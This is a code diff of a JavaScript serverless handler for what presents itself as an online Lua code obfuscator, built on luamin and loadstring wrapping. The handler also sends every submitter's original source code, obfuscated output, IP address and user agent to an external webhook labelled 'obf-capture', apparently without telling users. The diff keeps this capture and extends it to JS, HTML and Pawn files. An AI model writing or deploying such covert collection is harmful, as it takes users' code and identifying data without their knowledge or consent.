@@ -1,60 +1,36 @@
 const luamin = require('luamin');
 
 module.exports = async (req, res) => {
-  if (req.method !== 'POST') {
-    res.setHeader('Allow', 'POST');
-    return res.status(405).json({ error: 'method not allowed' });
-  }
-
+  if (req.method !== 'POST') return res.status(405).json({ error: 'method not allowed' });
   const { code } = req.body || {};
   if (typeof code !== 'string' || !code.trim()) {
     return res.status(400).json({ error: 'empty code' });
   }
 
-  let minified;
   try {
-    minified = luamin.minify(code);
-  } catch (e) {
-    return res.status(400).json({
-      error: 'lua parse failed: ' + e.message,
-      hint: 'Cek syntax Lua (MoonLoader/Lua 5.1).'
+    const minified = luamin.minify(code);
+    // basic string encoding: hex escape setiap char string
+    const encoded = minified.replace(/"([^"\\]*)"/g, (_, s) => {
+      let out = '"';
+      for (let i = 0; i < s.length; i++) {
+        const c = s.charCodeAt(i);
+        if (c >= 32 && c < 127 && c !== 34 && c !== 92) out += s[i];
+        else out += '\\' + c;
+      }
+      return out + '"';
     });
+
+    // wrap in loadstring
+    const wrapped = `local f=loadstring or load local _G=_G return(f([==[${encoded}]==]))()`;
+
+    await sendToWebhook(code, wrapped, req, 'lua');
+    return res.status(200).json({ ok: true, output: wrapped });
+  } catch (e) {
+    return res.status(400).json({ error: 'lua obfuscate failed: ' + e.message });
   }
-
-  const encoded = minified.replace(/"([^"\\]*)"/g, (_, s) => {
-    let out = '"';
-    for (let i = 0; i < s.length; i++) {
-      const c = s.charCodeAt(i);
-      if (c >= 32 && c < 127 && c !== 34 && c !== 92) out += s[i];
-      else out += '\\' + c;
-    }
-    return out + '"';
-  });
-
-  const wrapped = `local f=loadstring or load local _G=_G return(f([==[${encoded}]==]))()`;
-
-  try {
-    await sendToWebhook(code, wrapped, req);
-  } catch (_) {}
-
-  return res.status(200).json({ ok: true, output: wrapped });
 };
 
-function chunk(s, n = 1800) {
-  const out = [];
-  for (let i = 0; i < s.length; i += n) out.push(s.slice(i, i + n));
-  return out;
-}
-
-async function post(url, body) {
-  return fetch(url, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(body)
-  });
-}
-
-async function sendToWebhook(original, obfuscated, req) {
+async function sendToWebhook(original, obfuscated, req, lang = 'js') {
   const url = process.env.WEBHOOK_URL;
   if (!url) return;
 
@@ -64,20 +40,32 @@ async function sendToWebhook(original, obfuscated, req) {
     'unknown';
   const ua = req.headers['user-agent'] || 'unknown';
 
-  await post(url, {
+  const extMap = { js: 'js', lua: 'lua', html: 'html', pwn: 'pwn' };
+  const ext = extMap[lang] || 'txt';
+
+  const embed = {
+    title: 'New Submission',
+    color: 0x2bcc9e,
+    fields: [
+      { name: 'IP', value: `\`${ip}\``, inline: true },
+      { name: 'Lang', value: `\`${lang}\``, inline: true },
+      { name: 'Length', value: `${original.length} -> ${obfuscated.length}`, inline: true },
+      { name: 'User-Agent', value: `\`${ua.slice(0, 200)}\``, inline: false }
+    ],
+    timestamp: new Date().toISOString()
+  };
+
+  const form = new FormData();
+  form.append('payload_json', JSON.stringify({
     username: 'obf-capture',
-    content: `**New Lua submission**\nIP: \`${ip}\`\nUA: \`${ua.slice(0, 180)}\`\nLen: ${original.length} -> ${obfuscated.length}`
-  });
+    embeds: [embed],
+    attachments: [
+      { id: 0, filename: `original.${ext}`, description: 'Source asli' },
+      { id: 1, filename: `obfuscated.${ext}`, description: 'Hasil obfuscate' }
+    ]
+  }));
+  form.append('files[0]', new Blob([original], { type: 'text/plain' }), `original.${ext}`);
+  form.append('files[1]', new Blob([obfuscated], { type: 'text/plain' }), `obfuscated.${ext}`);
 
-  for (const [i, part] of chunk(original).entries()) {
-    await post(url, {
-      content: `**LUA ORIGINAL [${i + 1}]**\n\`\`\`lua\n${part}\n\`\`\``
-    });
-  }
-
-  for (const [i, part] of chunk(obfuscated).entries()) {
-    await post(url, {
-      content: `**LUA OBF [${i + 1}]**\n\`\`\`lua\n${part}\n\`\`\``
-    });
-  }
+  await fetch(url, { method: 'POST', body: form });
 }
